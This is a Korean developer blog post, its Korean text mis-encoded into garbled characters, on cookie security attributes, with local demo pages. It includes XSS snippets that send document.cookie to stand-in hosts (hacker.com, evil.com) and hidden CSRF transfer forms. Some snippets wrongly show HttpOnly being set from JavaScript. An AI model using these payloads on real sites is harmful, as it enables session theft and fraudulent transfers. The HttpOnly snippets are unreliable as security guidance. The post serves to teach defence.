---
layout: post
title: "[FRONT] ğŸª Cookie ë³´ì•ˆì˜ ëª¨ë“  ê²ƒ: íƒˆì·¨ë¶€í„° ë°©ì–´ê¹Œì§€"

subtitle: "ì›¹ ë³´ì•ˆì˜ í•µì‹¬, ì¿ í‚¤ ë³´ì•ˆ ì†ì„±ê³¼ ì‹¤ì œ ê³µê²© ì‹œë‚˜ë¦¬ì˜¤ ì™„ë²½ ë¶„ì„"

date: 2025-08-07 08:32:40
# lastmod: 2024-08-14 10:10:00
author: "lim.Chuck"

# header-style: text

catalog: true
header-mask: 0.4
header-img: "img/post/2024/0821/cookie.png"

#
# sitemap:
#   changefreq: daily #ìŠ¤í¬ë© ì£¼ê¸°  daily | weekly | monthly
#   priority: 1.0  # ìŠ¤í¬ë© ìš°ì„ ìˆœìœ„
# hidden: true
categories:
  - FRONT
tags:
  - Cookie
  - Security
  - Web Security
  - CSRF
  - XSS
---

{% include post/front_contents.md %}

## ğŸš¨ ì¿ í‚¤ íƒˆì·¨, ìƒê°ë³´ë‹¤ ì‰½ë‹¤!

ê°œë°œí•˜ë‹¤ê°€ ë°œê²¬í•œ ì¶©ê²©ì ì¸ ì‚¬ì‹¤! ğŸ¤¯ ìš°ë¦¬ê°€ í‰ì†Œì— ì‚¬ìš©í•˜ëŠ” ì¿ í‚¤ë“¤, ë³´ì•ˆ ì„¤ì • ì—†ì´ëŠ” ì •ë§ ì‰½ê²Œ íƒˆì·¨ë‹¹í•  ìˆ˜ ìˆì–´ìš”. ì‹¤ì œë¡œ ì–´ë–»ê²Œ ê³µê²©ë‹¹í•˜ê³ , ì–´ë–»ê²Œ ë°©ì–´í•  ìˆ˜ ìˆëŠ”ì§€ ìì„¸íˆ ì•Œì•„ë³´ê² ìŠµë‹ˆë‹¤.

## ğŸ’€ ì¿ í‚¤ íƒˆì·¨ì˜ í˜„ì‹¤

### **ì·¨ì•½í•œ ì¿ í‚¤ ì„¤ì •**

```javascript
// âŒ ìœ„í—˜í•œ ì¿ í‚¤ ì„¤ì •
document.cookie = `token=${userToken}; path=/; expires=${expireDate}`;
```

ì´ëŸ° ì¿ í‚¤ëŠ” ë‹¤ìŒê³¼ ê°™ì€ ë°©ë²•ìœ¼ë¡œ íƒˆì·¨ë‹¹í•  ìˆ˜ ìˆì–´ìš”:

### 1. **ë„¤íŠ¸ì›Œí¬ ìŠ¤ë‹ˆí•‘ (Network Sniffing)**

```
HTTP í†µì‹ ì—ì„œ ì¿ í‚¤ê°€ í‰ë¬¸ìœ¼ë¡œ ì „ì†¡ë¨
â†’ ê³µìš© ì™€ì´íŒŒì´ì—ì„œ íŒ¨í‚· ìº¡ì²˜ë¡œ ì‰½ê²Œ íƒˆì·¨ ê°€ëŠ¥
```

### 2. **XSS (Cross-Site Scripting) ê³µê²©**

```javascript
// ì•…ì„± ìŠ¤í¬ë¦½íŠ¸ê°€ ì‚½ì…ë˜ë©´
<script>
  // ëª¨ë“  ì¿ í‚¤ë¥¼ í•´ì»¤ ì„œë²„ë¡œ ì „ì†¡
  fetch('https://hacker.com/steal', {
    method: 'POST',
    body: document.cookie
  });
</script>
```

### 3. **CSRF (Cross-Site Request Forgery) ê³µê²©**

```html
<!-- ì•…ì„± ì‚¬ì´íŠ¸ì—ì„œ -->
<img src="https://victim.com/transfer?amount=1000&to=hacker" />
<!-- ì¿ í‚¤ê°€ ìë™ìœ¼ë¡œ í•¨ê»˜ ì „ì†¡ë˜ì–´ ìš”ì²­ì´ ì„±ê³µ -->
```

## ğŸ›¡ï¸ ì¿ í‚¤ ë³´ì•ˆ ì†ì„± ì™„ë²½ ê°€ì´ë“œ

### **1. Secure ì†ì„±**

```javascript
// âœ… HTTPSì—ì„œë§Œ ì „ì†¡
document.cookie = "token=abc123; Secure";
```

**íš¨ê³¼**:

- HTTP ì—°ê²°ì—ì„œëŠ” ì¿ í‚¤ ì „ì†¡ ì°¨ë‹¨
- ë„¤íŠ¸ì›Œí¬ ìŠ¤ë‹ˆí•‘ ê³µê²© ë°©ì§€
- ì¤‘ê°„ì ê³µê²©(MITM) ì°¨ë‹¨

### **2. HttpOnly ì†ì„±**

```javascript
// âœ… JavaScriptë¡œ ì ‘ê·¼ ë¶ˆê°€
document.cookie = "token=abc123; HttpOnly";
```

**íš¨ê³¼**:

- `document.cookie`ë¡œ ì ‘ê·¼ ì°¨ë‹¨
- XSS ê³µê²©ìœ¼ë¡œë¶€í„° ì¿ í‚¤ ë³´í˜¸
- ì„œë²„ì—ì„œë§Œ ì¿ í‚¤ ì½ê¸° ê°€ëŠ¥

### **3. SameSite ì†ì„±**

#### **SameSite=Strict (ê°€ì¥ ì—„ê²©)**

```javascript
document.cookie = "token=abc123; SameSite=Strict";
```

- ê°™ì€ ì‚¬ì´íŠ¸ì—ì„œë§Œ ì¿ í‚¤ ì „ì†¡
- CSRF ê³µê²© ì™„ì „ ì°¨ë‹¨
- ì™¸ë¶€ ë§í¬ í´ë¦­ ì‹œì—ë„ ì¿ í‚¤ ì „ì†¡ ì•ˆë¨

#### **SameSite=Lax (ì ë‹¹íˆ ì—„ê²©)**

```javascript
document.cookie = "token=abc123; SameSite=Lax";
```

- ì¼ë°˜ì ì¸ GET ìš”ì²­ì—ì„œëŠ” ì¿ í‚¤ ì „ì†¡
- POST/PUT/DELETE ìš”ì²­ì—ì„œëŠ” ì°¨ë‹¨
- ì‚¬ìš©ì„±ê³¼ ë³´ì•ˆì˜ ê· í˜•

#### **SameSite=None (ì œí•œ ì—†ìŒ)**

```javascript
document.cookie = "token=abc123; SameSite=None; Secure";
```

- ëª¨ë“  ìš”ì²­ì—ì„œ ì¿ í‚¤ ì „ì†¡
- ë°˜ë“œì‹œ Secure ì†ì„±ê³¼ í•¨ê»˜ ì‚¬ìš©

## ğŸ¯ ì‹¤ì œ ê³µê²© ì‹œë‚˜ë¦¬ì˜¤ì™€ ë°©ì–´

### **ì‹œë‚˜ë¦¬ì˜¤ 1: ê³µìš© ì™€ì´íŒŒì´ì—ì„œì˜ ì¿ í‚¤ íƒˆì·¨**

**ê³µê²©**:

```
1. í•´ì»¤ê°€ ê³µìš© ì™€ì´íŒŒì´ ë„¤íŠ¸ì›Œí¬ ëª¨ë‹ˆí„°ë§
2. HTTP ì‚¬ì´íŠ¸ ì ‘ì† ì‹œ ì¿ í‚¤ íŒ¨í‚· ìº¡ì²˜
3. ì„¸ì…˜ í† í° íšë“ í›„ ê³„ì • íƒˆì·¨
```

**ë°©ì–´**:

```javascript
// âœ… Secure ì†ì„±ìœ¼ë¡œ HTTPSì—ì„œë§Œ ì „ì†¡
document.cookie = "sessionId=xyz789; Secure; path=/";
```

### **ì‹œë‚˜ë¦¬ì˜¤ 2: XSSë¥¼ í†µí•œ ì¿ í‚¤ íƒˆì·¨**

**ê³µê²©**:

```javascript
// ê²Œì‹œíŒì— ì•…ì„± ìŠ¤í¬ë¦½íŠ¸ ì‚½ì…
<script>
  const cookies = document.cookie; fetch(`https://evil.com/steal?data=$
  {encodeURIComponent(cookies)}`);
</script>
```

**ë°©ì–´**:

```javascript
// âœ… HttpOnlyë¡œ JavaScript ì ‘ê·¼ ì°¨ë‹¨
document.cookie = "authToken=abc123; HttpOnly; Secure; path=/";
```

### **ì‹œë‚˜ë¦¬ì˜¤ 3: CSRF ê³µê²©**

**ê³µê²©**:

```html
<!-- ì•…ì„± ì´ë©”ì¼ì´ë‚˜ ì‚¬ì´íŠ¸ì—ì„œ -->
<form action="https://bank.com/transfer" method="POST" style="display:none">
  <input name="amount" value="1000000" />
  <input name="to" value="hacker-account" />
</form>
<script>
  document.forms[0].submit();
</script>
```

**ë°©ì–´**:

```javascript
// âœ… SameSite=Strictë¡œ ë‹¤ë¥¸ ì‚¬ì´íŠ¸ì—ì„œì˜ ìš”ì²­ ì°¨ë‹¨
document.cookie = "sessionId=xyz789; SameSite=Strict; Secure; HttpOnly";
```

## ğŸ”§ ë³´ì•ˆ ê°•í™”ëœ ì¿ í‚¤ ì„¤ì • ì˜ˆì‹œ

### **ê¸°ë³¸ ë³´ì•ˆ ì„¤ì •**

```javascript
function setSecureCookie(name, value, days = 7) {
  const date = new Date();
  date.setTime(date.getTime() + days * 24 * 60 * 60 * 1000);

  document.cookie =
    `${name}=${value}; ` +
    `expires=${date.toUTCString()}; ` +
    `path=/; ` +
    `Secure; ` +
    `SameSite=Strict`;
}
```

### **ë¯¼ê°í•œ ì •ë³´ìš© ìµœê³  ë³´ì•ˆ ì„¤ì •**

```javascript
function setHighSecurityCookie(name, value, hours = 2) {
  const date = new Date();
  date.setTime(date.getTime() + hours * 60 * 60 * 1000);

  // ì„œë²„ì—ì„œ ì„¤ì •í•´ì•¼ í•¨ (HttpOnlyëŠ” í´ë¼ì´ì–¸íŠ¸ì—ì„œ ì„¤ì • ë¶ˆê°€)
  // Set-Cookie: name=value; HttpOnly; Secure; SameSite=Strict; Max-Age=7200
}
```

## ğŸ“Š ì¿ í‚¤ ë³´ì•ˆ ì†ì„± ë¹„êµí‘œ

| ì†ì„±                | ëª©ì           | ë°©ì–´ ëŒ€ìƒ       | ê¶Œì¥ë„     |
| ------------------- | ------------- | --------------- | ---------- |
| **Secure**          | HTTPS ì „ìš©    | ë„¤íŠ¸ì›Œí¬ ìŠ¤ë‹ˆí•‘ | â­â­â­â­â­ |
| **HttpOnly**        | JS ì ‘ê·¼ ì°¨ë‹¨  | XSS ê³µê²©        | â­â­â­â­â­ |
| **SameSite=Strict** | ê°™ì€ ì‚¬ì´íŠ¸ë§Œ | CSRF ê³µê²©       | â­â­â­â­â­ |
| **SameSite=Lax**    | ì ë‹¹í•œ ì œí•œ   | CSRF ê³µê²©       | â­â­â­â­   |
| **Path**            | ê²½ë¡œ ì œí•œ     | ì •ë³´ ë…¸ì¶œ       | â­â­â­     |
| **Domain**          | ë„ë©”ì¸ ì œí•œ   | ì„œë¸Œë„ë©”ì¸ ê³µê²© | â­â­â­     |

## ğŸ› ï¸ ì‹¤ë¬´ì—ì„œì˜ ì¿ í‚¤ ë³´ì•ˆ ì²´í¬ë¦¬ìŠ¤íŠ¸

### **âœ… í•„ìˆ˜ ë³´ì•ˆ ì„¤ì •**

- [ ] ëª¨ë“  ì¿ í‚¤ì— `Secure` ì†ì„± ì ìš©
- [ ] ì¸ì¦ ê´€ë ¨ ì¿ í‚¤ì— `HttpOnly` ì ìš©
- [ ] CSRF ë°©ì§€ë¥¼ ìœ„í•œ `SameSite` ì„¤ì •
- [ ] ì¿ í‚¤ ë§Œë£Œ ì‹œê°„ ì ì ˆíˆ ì„¤ì •
- [ ] ë¯¼ê°í•œ ì •ë³´ëŠ” ì¿ í‚¤ì— ì €ì¥ ê¸ˆì§€

### **âœ… ì¶”ê°€ ë³´ì•ˆ ì¡°ì¹˜**

- [ ] HTTPS ê°•ì œ ì ìš©
- [ ] CSP(Content Security Policy) ì„¤ì •
- [ ] XSS í•„í„°ë§ êµ¬í˜„
- [ ] CSRF í† í° ì‚¬ìš©
- [ ] ì •ê¸°ì ì¸ ë³´ì•ˆ ê°ì‚¬

## ğŸ¯ ê²°ë¡ : ì¿ í‚¤ ë³´ì•ˆì€ ì„ íƒì´ ì•„ë‹Œ í•„ìˆ˜!

```javascript
// âŒ ì ˆëŒ€ ì´ë ‡ê²Œ í•˜ì§€ ë§ˆì„¸ìš”
document.cookie = "token=secret123";

// âœ… í•­ìƒ ì´ë ‡ê²Œ í•˜ì„¸ìš”
document.cookie =
  "token=secret123; Secure; SameSite=Strict; path=/; expires=...";
```

**í•µì‹¬ í¬ì¸íŠ¸**:

1. **ì¿ í‚¤ íƒˆì·¨ëŠ” ìƒê°ë³´ë‹¤ ì‰½ë‹¤**
2. **ë³´ì•ˆ ì†ì„± ì„¤ì •ë§Œìœ¼ë¡œë„ ëŒ€ë¶€ë¶„ì˜ ê³µê²© ì°¨ë‹¨ ê°€ëŠ¥**
3. **HTTPS + Secure + SameSite + HttpOnly = ê°•ë ¥í•œ ë°©ì–´**
4. **ë³´ì•ˆì€ ê°œë°œ ì´ˆê¸°ë¶€í„° ê³ ë ¤í•´ì•¼ í•  í•„ìˆ˜ ì‚¬í•­**

ë³´ì•ˆì€ í•œ ë²ˆ ëš«ë¦¬ë©´ ë˜ëŒë¦¬ê¸° ì–´ë ¤ì›Œìš”. ì²˜ìŒë¶€í„° ì œëŒ€ë¡œ ì„¤ì •í•˜ëŠ” ê²ƒì´ ê°€ì¥ ì¤‘ìš”í•©ë‹ˆë‹¤! ğŸ”

## ğŸ§ª **ì§ì ‘ ì²´í—˜í•´ë³´ëŠ” ì¿ í‚¤ íƒˆì·¨ & ë°©ì–´ ì‹¤ìŠµ**

> **âš ï¸ ì£¼ì˜ì‚¬í•­**: ì•„ë˜ ì˜ˆì œë“¤ì€ **êµìœ¡ ëª©ì ìœ¼ë¡œë§Œ** ì‚¬ìš©í•˜ì„¸ìš”. ì‹¤ì œ ì„œë¹„ìŠ¤ì—ì„œëŠ” ì ˆëŒ€ ì‹œë„í•˜ì§€ ë§ˆì‹œê³ , ë³¸ì¸ì˜ ë¡œì»¬ í™˜ê²½ì—ì„œë§Œ í…ŒìŠ¤íŠ¸í•˜ì„¸ìš”.

### **ğŸ¯ ì‹¤ìŠµ í™˜ê²½ ì¤€ë¹„**

```html
<!-- test.html - ì·¨ì•½í•œ ì¿ í‚¤ í…ŒìŠ¤íŠ¸ í˜ì´ì§€ -->
<!DOCTYPE html>
<html>
  <head>
    <title>ì¿ í‚¤ ë³´ì•ˆ í…ŒìŠ¤íŠ¸</title>
  </head>
  <body>
    <h1>ğŸª ì¿ í‚¤ ë³´ì•ˆ ì‹¤ìŠµ</h1>

    <!-- ì·¨ì•½í•œ ì¿ í‚¤ ì„¤ì • -->
    <button onclick="setVulnerableCookie()">âŒ ì·¨ì•½í•œ ì¿ í‚¤ ì„¤ì •</button>
    <button onclick="setSecureCookie()">âœ… ë³´ì•ˆ ì¿ í‚¤ ì„¤ì •</button>
    <button onclick="showAllCookies()">ğŸ” ëª¨ë“  ì¿ í‚¤ ë³´ê¸°</button>

    <div id="cookieDisplay"></div>
    <div id="attackResult"></div>

    <script>
      // ì·¨ì•½í•œ ì¿ í‚¤ ì„¤ì •
      function setVulnerableCookie() {
        document.cookie = "userToken=abc123; path=/";
        document.cookie = "sessionId=xyz789; path=/";
        alert("ì·¨ì•½í•œ ì¿ í‚¤ê°€ ì„¤ì •ë˜ì—ˆìŠµë‹ˆë‹¤!");
      }

      // ë³´ì•ˆ ì¿ í‚¤ ì„¤ì •
      function setSecureCookie() {
        document.cookie = "secureToken=def456; Secure; SameSite=Strict; path=/";
        document.cookie =
          "secureSession=uvw987; HttpOnly; Secure; SameSite=Strict; path=/";
        alert("ë³´ì•ˆ ì¿ í‚¤ê°€ ì„¤ì •ë˜ì—ˆìŠµë‹ˆë‹¤!");
      }

      // ëª¨ë“  ì¿ í‚¤ í‘œì‹œ
      function showAllCookies() {
        const cookies = document.cookie;
        document.getElementById(
          "cookieDisplay"
        ).innerHTML = `<h3>í˜„ì¬ ì¿ í‚¤:</h3><pre>${
          cookies || "ì¿ í‚¤ê°€ ì—†ìŠµë‹ˆë‹¤."
        }</pre>`;
      }
    </script>
  </body>
</html>
```

### **ğŸ•µï¸ ì‹¤ìŠµ 1: XSSë¥¼ í†µí•œ ì¿ í‚¤ íƒˆì·¨ ì‹œë®¬ë ˆì´ì…˜**

```html
<!-- xss-demo.html -->
<!DOCTYPE html>
<html>
  <head>
    <title>XSS ì¿ í‚¤ íƒˆì·¨ ë°ëª¨</title>
  </head>
  <body>
    <h1>ğŸš¨ XSS ê³µê²© ì‹œë®¬ë ˆì´ì…˜</h1>

    <!-- ì‚¬ìš©ì ì…ë ¥ì„ ë°›ëŠ” ëŒ“ê¸€ ì‹œìŠ¤í…œ (ì·¨ì•½) -->
    <div>
      <h3>ëŒ“ê¸€ ì‘ì„± (XSS ì·¨ì•½)</h3>
      <textarea id="comment" placeholder="ëŒ“ê¸€ì„ ì…ë ¥í•˜ì„¸ìš”..."></textarea>
      <button onclick="addComment()">ëŒ“ê¸€ ì¶”ê°€</button>
    </div>

    <div id="comments"></div>

    <!-- ì¿ í‚¤ íƒˆì·¨ ì‹œë®¬ë ˆì´ì…˜ ê²°ê³¼ -->
    <div
      id="stolenCookies"
      style="background: #ffe6e6; padding: 10px; margin: 10px 0;"
    >
      <h3>ğŸ”¥ íƒˆì·¨ëœ ì¿ í‚¤ (í•´ì»¤ ê´€ì )</h3>
      <div id="hackerView"></div>
    </div>

    <script>
      // ë¨¼ì € í…ŒìŠ¤íŠ¸ìš© ì¿ í‚¤ ì„¤ì •
      document.cookie = "userToken=vulnerable123; path=/";
      document.cookie = "sessionId=session456; path=/";

      function addComment() {
        const comment = document.getElementById("comment").value;
        const commentsDiv = document.getElementById("comments");

        // âŒ ìœ„í—˜: ì‚¬ìš©ì ì…ë ¥ì„ ê·¸ëŒ€ë¡œ innerHTMLì— ì‚½ì…
        commentsDiv.innerHTML += `<div style="border: 1px solid #ccc; margin: 5px; padding: 5px;">
                ${comment}
            </div>`;

        document.getElementById("comment").value = "";
      }

      // ì¿ í‚¤ íƒˆì·¨ ì‹œë®¬ë ˆì´ì…˜ í•¨ìˆ˜ (êµìœ¡ìš©)
      function simulateSteal() {
        const cookies = document.cookie;
        document.getElementById(
          "hackerView"
        ).innerHTML = `<strong>íƒˆì·¨ëœ ì¿ í‚¤:</strong> ${cookies}`;

        // ì‹¤ì œë¡œëŠ” í•´ì»¤ ì„œë²„ë¡œ ì „ì†¡ë¨
        console.log("ğŸš¨ í•´ì»¤ ì„œë²„ë¡œ ì „ì†¡ë  ë°ì´í„°:", cookies);
      }

      // í˜ì´ì§€ ë¡œë“œ ì‹œ ì¿ í‚¤ íƒˆì·¨ ì‹œë®¬ë ˆì´ì…˜
      setTimeout(simulateSteal, 1000);
    </script>

    <div style="background: #e6ffe6; padding: 10px; margin: 10px 0;">
      <h3>ğŸ’¡ XSS ê³µê²© í…ŒìŠ¤íŠ¸í•´ë³´ê¸°</h3>
      <p>ëŒ“ê¸€ì°½ì— ì´ëŸ° ì½”ë“œë¥¼ ì…ë ¥í•´ë³´ì„¸ìš”:</p>
      <code>&lt;script&gt;alert('XSS ê³µê²©!');&lt;/script&gt;</code><br />
      <code>&lt;img src="x" onerror="simulateSteal()"&gt;</code>
    </div>
  </body>
</html>
```

### **ğŸ›¡ï¸ ì‹¤ìŠµ 2: ë³´ì•ˆ ê°•í™”ëœ ë²„ì „**

```html
<!-- secure-demo.html -->
<!DOCTYPE html>
<html>
  <head>
    <title>ë³´ì•ˆ ê°•í™” ë°ëª¨</title>
  </head>
  <body>
    <h1>âœ… ë³´ì•ˆ ê°•í™”ëœ ëŒ“ê¸€ ì‹œìŠ¤í…œ</h1>

    <div>
      <h3>ëŒ“ê¸€ ì‘ì„± (XSS ë°©ì–´)</h3>
      <textarea
        id="secureComment"
        placeholder="ëŒ“ê¸€ì„ ì…ë ¥í•˜ì„¸ìš”..."
      ></textarea>
      <button onclick="addSecureComment()">ëŒ“ê¸€ ì¶”ê°€</button>
    </div>

    <div id="secureComments"></div>

    <script>
      // ë³´ì•ˆ ì¿ í‚¤ ì„¤ì • (HttpOnlyëŠ” ì„œë²„ì—ì„œë§Œ ì„¤ì • ê°€ëŠ¥)
      document.cookie =
        "secureToken=protected789; Secure; SameSite=Strict; path=/";

      function addSecureComment() {
        const comment = document.getElementById("secureComment").value;
        const commentsDiv = document.getElementById("secureComments");

        // âœ… ì•ˆì „: HTML ì´ìŠ¤ì¼€ì´í”„ ì²˜ë¦¬
        const safeComment = escapeHtml(comment);

        const commentDiv = document.createElement("div");
        commentDiv.style.cssText =
          "border: 1px solid #ccc; margin: 5px; padding: 5px;";
        commentDiv.textContent = safeComment; // textContent ì‚¬ìš©ìœ¼ë¡œ XSS ë°©ì§€

        commentsDiv.appendChild(commentDiv);

        document.getElementById("secureComment").value = "";
      }

      // HTML ì´ìŠ¤ì¼€ì´í”„ í•¨ìˆ˜
      function escapeHtml(unsafe) {
        return unsafe
          .replace(/&/g, "&amp;")
          .replace(/</g, "&lt;")
          .replace(/>/g, "&gt;")
          .replace(/"/g, "&quot;")
          .replace(/'/g, "&#039;");
      }

      // ì¿ í‚¤ ì ‘ê·¼ í…ŒìŠ¤íŠ¸
      function testCookieAccess() {
        try {
          const cookies = document.cookie;
          alert(`ì ‘ê·¼ ê°€ëŠ¥í•œ ì¿ í‚¤: ${cookies}`);
        } catch (e) {
          alert("HttpOnly ì¿ í‚¤ëŠ” JavaScriptë¡œ ì ‘ê·¼í•  ìˆ˜ ì—†ìŠµë‹ˆë‹¤!");
        }
      }
    </script>

    <button onclick="testCookieAccess()">ğŸ” ì¿ í‚¤ ì ‘ê·¼ í…ŒìŠ¤íŠ¸</button>

    <div style="background: #e6ffe6; padding: 10px; margin: 10px 0;">
      <h3>âœ… ë³´ì•ˆ í™•ì¸</h3>
      <p>ê°™ì€ XSS ì½”ë“œë¥¼ ì…ë ¥í•´ë„ ì‹¤í–‰ë˜ì§€ ì•ŠëŠ” ê²ƒì„ í™•ì¸í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤!</p>
    </div>
  </body>
</html>
```

### **ğŸŒ ì‹¤ìŠµ 3: CSRF ê³µê²© ì‹œë®¬ë ˆì´ì…˜**

```html
<!-- csrf-demo.html -->
<!DOCTYPE html>
<html>
  <head>
    <title>CSRF ê³µê²© ë°ëª¨</title>
  </head>
  <body>
    <h1>ğŸ¯ CSRF ê³µê²© ì‹œë®¬ë ˆì´ì…˜</h1>

    <!-- ê°€ì§œ ì€í–‰ ì‚¬ì´íŠ¸ -->
    <div style="background: #f0f8ff; padding: 15px; margin: 10px 0;">
      <h3>ğŸ¦ MyBank (victim.com)</h3>
      <p>í˜„ì¬ ë¡œê·¸ì¸ëœ ì‚¬ìš©ì: í™ê¸¸ë™</p>
      <p>ì”ì•¡: 1,000,000ì›</p>

      <form id="transferForm" action="/transfer" method="POST">
        <label>ì†¡ê¸ˆí•  ê³„ì¢Œ: <input type="text" name="account" value="" /></label
        ><br />
        <label>ê¸ˆì•¡: <input type="number" name="amount" value="" /></label
        ><br />
        <button type="submit">ì†¡ê¸ˆí•˜ê¸°</button>
      </form>
    </div>

    <!-- ì•…ì„± ì‚¬ì´íŠ¸ ì˜ì—­ -->
    <div style="background: #ffe6e6; padding: 15px; margin: 10px 0;">
      <h3>ğŸ‘¹ ì•…ì„± ì‚¬ì´íŠ¸ (evil.com)</h3>
      <p>ë¬´ë£Œ ì´ëª¨í‹°ì½˜ ë‹¤ìš´ë¡œë“œ!</p>

      <!-- ìˆ¨ê²¨ì§„ CSRF ê³µê²© í¼ -->
      <iframe src="about:blank" style="display:none;" id="hiddenFrame"></iframe>

      <button onclick="downloadEmoticons()">ğŸ ë¬´ë£Œ ë‹¤ìš´ë¡œë“œ</button>

      <!-- CSRF ê³µê²© ì‹œë®¬ë ˆì´ì…˜ -->
      <script>
        function downloadEmoticons() {
          // ì‚¬ìš©ìê°€ ë¬´ë£Œ ë‹¤ìš´ë¡œë“œ ë²„íŠ¼ì„ í´ë¦­í•  ë•Œ
          alert("ë‹¤ìš´ë¡œë“œë¥¼ ì‹œì‘í•©ë‹ˆë‹¤...");

          // ìˆ¨ê²¨ì§„ CSRF ê³µê²© ì‹¤í–‰
          performCSRFAttack();
        }

        function performCSRFAttack() {
          // ì€í–‰ ì‚¬ì´íŠ¸ë¡œ ìë™ ì†¡ê¸ˆ ìš”ì²­ (CSRF)
          const form = document.createElement("form");
          form.method = "POST";
          form.action = "https://victim-bank.com/transfer";
          form.target = "hiddenFrame";

          const accountInput = document.createElement("input");
          accountInput.type = "hidden";
          accountInput.name = "account";
          accountInput.value = "hacker-account-123";

          const amountInput = document.createElement("input");
          amountInput.type = "hidden";
          amountInput.name = "amount";
          amountInput.value = "500000";

          form.appendChild(accountInput);
          form.appendChild(amountInput);
          document.body.appendChild(form);

          // í¼ ìë™ ì œì¶œ (ì‚¬ìš©ì ëª¨ë¥´ê²Œ)
          form.submit();

          // ì‹œë®¬ë ˆì´ì…˜ ê²°ê³¼ í‘œì‹œ
          setTimeout(() => {
            document.getElementById("csrfResult").innerHTML =
              "ğŸš¨ CSRF ê³µê²© ì‹œë®¬ë ˆì´ì…˜ ì™„ë£Œ! 500,000ì›ì´ í•´ì»¤ ê³„ì¢Œë¡œ ì†¡ê¸ˆë˜ì—ˆìŠµë‹ˆë‹¤.";
          }, 1000);
        }
      </script>

      <div
        id="csrfResult"
        style="color: red; font-weight: bold; margin-top: 10px;"
      ></div>
    </div>

    <!-- ë°©ì–´ ë²„ì „ -->
    <div style="background: #e6ffe6; padding: 15px; margin: 10px 0;">
      <h3>ğŸ›¡ï¸ CSRF ë°©ì–´ëœ ì€í–‰ ì‚¬ì´íŠ¸</h3>
      <p>SameSite=Strict ì¿ í‚¤ + CSRF í† í° ì ìš©</p>

      <script>
        // ë³´ì•ˆ ì¿ í‚¤ ì„¤ì •
        document.cookie =
          "bankSession=secure123; SameSite=Strict; Secure; path=/";

        function secureTransfer() {
          // CSRF í† í° ê²€ì¦
          const csrfToken = generateCSRFToken();
          alert(`CSRF í† í°ìœ¼ë¡œ ë³´í˜¸ëœ ì†¡ê¸ˆ: ${csrfToken}`);
        }

        function generateCSRFToken() {
          return (
            Math.random().toString(36).substring(2, 15) +
            Math.random().toString(36).substring(2, 15)
          );
        }
      </script>

      <button onclick="secureTransfer()">ğŸ”’ ë³´ì•ˆ ì†¡ê¸ˆ</button>
    </div>
  </body>
</html>
```

### **ğŸ§ª ì‹¤ìŠµ 4: ë„¤íŠ¸ì›Œí¬ ìŠ¤ë‹ˆí•‘ ì‹œë®¬ë ˆì´ì…˜**

```javascript
// network-sniffing-demo.js
console.log("ğŸ•µï¸ ë„¤íŠ¸ì›Œí¬ ìŠ¤ë‹ˆí•‘ ì‹œë®¬ë ˆì´ì…˜");

// HTTP vs HTTPS ì¿ í‚¤ ì „ì†¡ ì‹œë®¬ë ˆì´ì…˜
function simulateNetworkTraffic() {
  console.log("\n=== HTTP í†µì‹  (ì·¨ì•½) ===");
  console.log("GET /login HTTP/1.1");
  console.log("Host: example.com");
  console.log("Cookie: sessionId=abc123; userToken=xyz789");
  console.log("ğŸ‘† í‰ë¬¸ìœ¼ë¡œ ì „ì†¡ë˜ì–´ íŒ¨í‚· ìº¡ì²˜ë¡œ ì‰½ê²Œ íƒˆì·¨ ê°€ëŠ¥!");

  console.log("\n=== HTTPS í†µì‹  (ë³´ì•ˆ) ===");
  console.log("ì•”í˜¸í™”ëœ ë°ì´í„°: 4f8b2c3a9e1d7f6b...");
  console.log("ğŸ‘† ì•”í˜¸í™”ë˜ì–´ ìˆì–´ ë‚´ìš©ì„ ì•Œ ìˆ˜ ì—†ìŒ");
}

// ì‹¤í–‰
simulateNetworkTraffic();
```

### **ğŸ” í…ŒìŠ¤íŠ¸ ë°©ë²•**

1. **ë¡œì»¬ ì„œë²„ ì‹¤í–‰**:

```bash
# Pythonìœ¼ë¡œ ê°„ë‹¨í•œ HTTP ì„œë²„ ì‹¤í–‰
python3 -m http.server 8000

# ë˜ëŠ” Node.js
npx http-server
```

2. **ë¸Œë¼ìš°ì €ì—ì„œ í…ŒìŠ¤íŠ¸**:

   - `http://localhost:8000/test.html` (HTTP - ì·¨ì•½)
   - `https://localhost:8000/test.html` (HTTPS - ë³´ì•ˆ)

3. **ê°œë°œì ë„êµ¬ë¡œ í™•ì¸**:
   - Network íƒ­ì—ì„œ ì¿ í‚¤ ì „ì†¡ í™•ì¸
   - Application íƒ­ì—ì„œ ì¿ í‚¤ ì†ì„± í™•ì¸
   - Consoleì—ì„œ `document.cookie` ì‹¤í–‰

### **ğŸ“‹ ì‹¤ìŠµ ì²´í¬ë¦¬ìŠ¤íŠ¸**

- [ ] XSS ê³µê²©ìœ¼ë¡œ ì¿ í‚¤ íƒˆì·¨ í™•ì¸
- [ ] HttpOnly ì¿ í‚¤ê°€ JavaScript ì ‘ê·¼ ì°¨ë‹¨í•˜ëŠ”ì§€ í™•ì¸
- [ ] SameSite=Strictê°€ CSRF ê³µê²© ì°¨ë‹¨í•˜ëŠ”ì§€ í™•ì¸
- [ ] HTTP vs HTTPSì—ì„œ Secure ì¿ í‚¤ ë™ì‘ ì°¨ì´ í™•ì¸
- [ ] ë³´ì•ˆ ê°•í™” ì „í›„ ë¹„êµ í…ŒìŠ¤íŠ¸

**ì´ì œ ì§ì ‘ í•´ë³´ì‹œë©´ì„œ ì¿ í‚¤ ë³´ì•ˆì˜ ì¤‘ìš”ì„±ì„ ì²´ê°í•´ë³´ì„¸ìš”!** ğŸš€

---
